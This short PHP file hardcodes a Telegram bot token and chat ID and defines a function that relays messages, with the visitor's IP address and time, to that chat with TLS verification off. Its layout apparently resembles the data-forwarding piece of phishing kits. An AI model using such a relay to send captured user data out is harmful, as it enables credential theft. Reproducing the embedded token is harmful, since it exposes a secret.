<?php


// telegram information
$token = "7604848706:AAHFUkzIr34A3SsOGffyJ_U_QnPRy1TJzh4";
$id = "5471260151";
 

function call($msg, $rms = null){
    global $token;
    global $id;
    $info = "


    
/- MORE INFO -/
IP: ".(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1')."
TIME: ".date("m/d/Y h:i:sa");


    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}





?>